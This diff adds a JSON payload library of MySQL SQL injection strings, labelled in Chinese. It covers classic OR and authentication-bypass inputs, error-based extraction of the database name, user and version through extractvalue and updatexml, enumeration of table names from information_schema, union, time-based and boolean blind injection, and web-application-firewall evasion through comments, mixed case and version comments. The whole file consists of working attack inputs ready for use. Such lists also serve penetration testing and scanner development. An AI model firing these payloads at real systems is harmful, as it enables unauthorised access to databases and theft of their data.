@@ -1,0 +1,127 @@
+{
+  "categories": {
+    "基础注入测试": {
+      "description": "基本的SQL注入测试payload",
+      "payloads": [
+        {
+          "name": "单引号测试",
+          "payload": "'"
+        },
+        {
+          "name": "经典OR注入",
+          "payload": "' OR '1'='1"
+        },
+        {
+          "name": "数字OR注入",
+          "payload": "' OR 1=1--"
+        },
+        {
+          "name": "管理员绕过",
+          "payload": "admin'--"
+        }
+      ]
+    },
+    "数据库信息获取": {
+      "description": "获取数据库基本信息的payload",
+      "payloads": [
+        {
+          "name": "获取数据库名(extractvalue)",
+          "payload": "'%09AND%09extractvalue(1,concat(0x7e,database(),0x7e))--"
+        },
+        {
+          "name": "获取数据库名(updatexml)",
+          "payload": "'%09AND%09updatexml(1,concat(0x7e,database(),0x7e),1)--"
+        },
+        {
+          "name": "获取用户信息",
+          "payload": "'%09AND%09extractvalue(1,concat(0x7e,user(),0x7e))--"
+        },
+        {
+          "name": "获取版本信息",
+          "payload": "'%09AND%09extractvalue(1,concat(0x7e,version(),0x7e))--"
+        }
+      ]
+    },
+    "表结构枚举": {
+      "description": "枚举数据库表和列信息",
+      "payloads": [
+        {
+          "name": "获取表名列表(extractvalue)",
+          "payload": "'%09AND%09extractvalue(1,concat(0x7e,(SELECT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),0x7e))--"
+        },
+        {
+          "name": "获取表名列表(updatexml)",
+          "payload": "'%09AND%09updatexml(1,concat(0x7e,(SELECT%09group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()),0x7e),1)--"
+        }
+      ]
+    },
+    "联合注入": {
+      "description": "Union-based SQL注入payload",
+      "payloads": [
+        {
+          "name": "Union获取数据库名",
+          "payload": "'%09UNION%09SELECT%091,2,database()--"
+        },
+        {
+          "name": "Union获取表名",
+          "payload": "'%09UNION%09SELECT%091,2,group_concat(table_name)%09from%09information_schema.tables%09where%09table_schema=database()--"
+        }
+      ]
+    },
+    "盲注测试": {
+      "description": "时间盲注和布尔盲注payload",
+      "payloads": [
+        {
+          "name": "时间延迟测试",
+          "payload": "'%09AND%09sleep(5)--"
+        },
+        {
+          "name": "条件时间盲注",
+          "payload": "'%09AND%09if(length(database())>5,sleep(5),1)--"
+        },
+        {
+          "name": "布尔盲注-长度测试",
+          "payload": "'%09AND%09length(database())>5--"
+        },
+        {
+          "name": "布尔盲注-字符测试",
+          "payload": "'%09AND%09ascii(substr(database(),1,1))>97--"
+        }
+      ]
+    },
+    "错误注入": {
+      "description": "基于错误的SQL注入方法",
+      "payloads": [
+        {
+          "name": "EXP函数错误注入",
+          "payload": "'%09AND%09exp(~(select%09*%09from(select%09database())a))--"
+        },
+        {
+          "name": "GTID函数错误注入",
+          "payload": "'%09AND%09gtid_subset(database(),1)--"
+        }
+      ]
+    },
+    "WAF绕过": {
+      "description": "绕过Web应用防火墙的技巧",
+      "payloads": [
+        {
+          "name": "注释绕过",
+          "payload": "'/**/AND/**/extractvalue(1,concat(0x7e,database(),0x7e))--"
+        },
+        {
+          "name": "大小写绕过",
+          "payload": "'%09AnD%09extractvalue(1,concat(0x7e,database(),0x7e))--"
+        },
+        {
+          "name": "版本注释绕过",
+          "payload": "'%09/*!50000AND*/%09extractvalue(1,concat(0x7e,database(),0x7e))--"
+        },
+        {
+          "name": "AND符号绕过",
+          "payload": "'%09%26%26%09extractvalue(1,concat(0x7e,database(),0x7e))--"
+        }
+      ]
+    }
+  }
+}
